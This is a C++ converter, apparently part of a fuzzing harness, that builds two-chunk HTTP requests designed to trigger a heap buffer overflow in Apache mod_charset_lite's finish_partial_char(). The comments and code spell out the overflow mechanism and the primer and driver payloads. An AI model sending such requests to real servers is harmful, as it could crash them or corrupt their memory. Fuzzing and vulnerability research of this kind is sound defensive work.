/*
 * Converter for the mod_charset_lite request-body overflow harness.
 *
 * Builds a chunked POST/PUT whose body is split across two HTTP chunks so a
 * partial multibyte character straddles bucket boundaries inside
 * xlate_in_filter() -> xlate_brigade():
 *
 *   chunk 1 (primer)  ends in an incomplete ISO-2022 escape  -> set_aside_partial_char()
 *   chunk 2 (driver)  keeps iconv() at APR_INCOMPLETE         -> finish_partial_char()
 *
 * finish_partial_char() does `ctx->buf[ctx->saved++] = **cur_str` in a loop with
 * no `saved < sizeof(ctx->buf)` check, so a long second chunk overruns the
 * 8-byte ctx->buf (FATTEST_CHAR) embedded in the heap charset_filter_ctx_t.
 */
#include "charset_body.pb.h"
#include "proto_converters/converters.h"
#include <cstdio>
#include <string>

// One HTTP/1.1 chunk: "<hexlen>\r\n<data>\r\n".
static std::string Chunk(const std::string &data)
{
    char hdr[32];
    std::snprintf(hdr, sizeof(hdr), "%zx\r\n", data.size());
    std::string s = hdr;
    s += data;
    s += "\r\n";
    return s;
}

static const char *TargetUri(XlateTarget t)
{
    switch (t) {
    case XT_JP2:
        return "/jp2";
    case XT_KR:
        return "/kr";
    case XT_CN:
        return "/cn";
    case XT_JP:
    default:
        return "/jp";
    }
}

std::string BuildCharsetRequest(const CharsetBody &req)
{
    const char *method = req.use_put() ? "PUT" : "POST";
    const char *uri = TargetUri(req.target());

    // bucket 1 primer: must be an INCOMPLETE multibyte sequence shorter than
    // FATTEST_CHAR (8) so set_aside_partial_char() stores it (saved < 8) instead
    // of bailing out with EES_LIMIT. Default: a lone ESC = start of an escape seq.
    std::string primer = req.primer();
    if (primer.size() > 7)
        primer.resize(7);
    if (primer.empty())
        primer = std::string("\x1b", 1);

    // bucket 2 driver: a long run that keeps iconv at APR_INCOMPLETE so
    // finish_partial_char() keeps appending to ctx->buf past index 8.
    std::string unit = req.driver();
    if (unit.empty())
        unit = std::string(
            "\x1b", 1
        ); // ESC run: never completes in glibc ISO-2022-{JP,JP-2,KR,CN-EXT}
    uint32_t rep = req.driver_repeat();
    if (rep == 0)
        rep = 1;
    std::string driver;
    // Cap well above the 8-byte buffer but bounded so the corpus stays small.
    for (uint32_t i = 0; i < rep && driver.size() < 8192; i++)
        driver += unit;

    std::string out;
    out += method;
    out += " ";
    out += uri;
    out += " HTTP/1.1\r\n";
    out += "Host: localhost\r\n";
    out += "Transfer-Encoding: chunked\r\n";
    for (int i = 0; i < req.extra_headers_size(); i++) {
        const Header &h = req.extra_headers(i);
        if (h.name().empty())
            continue;
        out += h.name();
        out += ": ";
        out += h.value();
        out += "\r\n";
    }
    out += "\r\n";

    // Two separate chunks => two separate buckets at XLATEIN => the partial char
    // set aside from chunk 1 is finished using chunk 2.
    out += Chunk(primer);
    out += Chunk(driver);
    out += "0\r\n\r\n";

    return out;
}
